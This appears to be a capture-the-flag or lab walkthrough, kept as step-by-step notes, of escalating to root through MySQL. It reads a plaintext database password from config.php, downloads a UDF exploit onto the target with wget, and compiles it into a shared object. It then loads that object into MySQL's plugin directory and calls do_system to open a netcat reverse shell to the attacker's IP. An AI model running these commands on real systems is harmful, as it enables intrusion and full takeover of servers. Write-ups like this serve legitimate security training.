#### -Navigated to directory "/var/www" and found "config.php" file and cat'd the file and found user "root" and password "EscalateRaftHubris123":

![](../Images/Pasted%20image%2020220605135538.png)

#### -Typed "netsat –tulpn" and found port "3306" (mysql) listening on localhost:

![](../Images/Pasted%20image%2020220605135719.png)

#### -Typed "mysql –u root –p" and logged in with the found password for mysql "EscalateRaftHubris123":

![](../Images/Pasted%20image%2020220605135743.png)

#### -Googled "mysql root privilege escalation" as I was able to login with root in Mysql and found the following webpage listing the steps to escalate privileges:

![](../Images/Pasted%20image%2020220605141120.png)
![](../Images/Pasted%20image%2020220605150109.png)
![](../Images/Pasted%20image%2020220605150123.png)
![](../Images/Pasted%20image%2020220605150134.png)
![](../Images/Pasted%20image%2020220605150150.png)
![](../Images/Pasted%20image%2020220605150158.png)

#### -Typed "searchsploit -m linux/local/1518.c" to place exploit on my kali machine

#### -Started a http server on my kali machine to host the "1518.c" file

#### -Navigated to "/var/www" directory on target machine as it was writeable

#### -Typed "wget [kali IP]:8295/1518.c" and the shared object file was downloaded to the target machine

#### -Typed "gcc -g -c 1518.c -o raptor_udf2.o -fPIC" and then "gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc" to be compiled into a shared object file

#### -Typed "mysql –u root –p" and logged in with the found password for mysql "EscalateRaftHubris123" to login into mysql:

![](../Images/Pasted%20image%2020220605152058.png)

#### -Typed "show variables like '%plugin%';" to show the current plugin directory in the database

![](../Images/Pasted%20image%2020220605152325.png)

#### -Typed "use mysql;"

#### -Typed "create table foo(line blob);"

#### -Typed "insert into foo values(load_file('/var/www/raptor_udf2.so'));"

#### -Typed "select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';"

#### -Typed "create function do_system returns integer soname 'raptor_udf2.so';"

#### -Typed "select * from mysql.func;" to conirm the "raptor_udf2.so" shared object file got placed in the do_system function table:

![](../Images/Pasted%20image%2020220605153153.png)

#### -Started a netcat listner on my kali machine listening on port 8295

#### -Typed "select do_system('nc 192.168.49.101 8295 -e /bin/bash');" in mysql database on target machine and received a root shell:

![](../Images/Pasted%20image%2020220605153640.png)

